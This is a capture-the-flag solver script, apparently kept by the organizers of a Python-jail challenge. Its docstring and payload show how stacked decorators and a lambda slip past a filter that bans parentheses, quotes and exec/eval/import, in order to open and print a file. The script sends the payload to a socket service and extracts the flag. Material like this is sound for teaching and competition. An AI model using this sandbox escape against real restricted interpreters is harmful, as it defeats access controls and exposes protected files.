#!/usr/bin/env python3
"""
Cat Jail v3 - Paws Off - solver (organizers only, do NOT ship to players).

Banned: ( ) ' " and exec/eval/import/input/breakpoint/help/compile, ASCII only.
Decorators are function calls without parentheses, applied bottom-up, and since
Python 3.9 (PEP 614) a decorator can be any expression, including a lambda.
The class name gives the string "catnip" without quotes:

    @print                      print(
    @list                         list(
    @open                           open(
    @lambda c: c.__name__             "catnip"
    class catnip: pass                )))

Usage:
    python3 solve.py [host] [port]      # default localhost 1346
"""
import re
import socket
import sys

PAYLOAD = "@print\n@list\n@open\n@lambda c: c.__name__\nclass catnip: pass\nEOF\n"

host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 1346
s = socket.create_connection((host, port), timeout=10)
buf = ""
while ">>> " not in buf:
    buf += s.recv(4096).decode(errors="replace")
s.sendall(PAYLOAD.encode())
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    buf += chunk.decode(errors="replace")
m = re.search(r"SecurinetsENIT\{[^}]*\}", buf)
print(m.group(0) if m else buf)
